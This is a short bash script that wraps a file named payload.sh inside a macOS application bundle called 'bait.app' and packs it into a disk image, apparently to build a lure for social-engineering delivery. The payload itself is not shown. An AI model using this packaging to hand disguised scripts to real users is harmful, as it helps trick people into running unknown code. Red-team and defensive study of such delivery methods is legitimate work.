#!/bin/bash
mkdir -p output/bait.app/Contents/MacOS
cp payload.sh output/bait.app/Contents/MacOS/bait
chmod +x output/bait.app/Contents/MacOS/bait
hdiutil create -volname BaitAPP -srcfolder output -ov -format UDZO bait.dmg
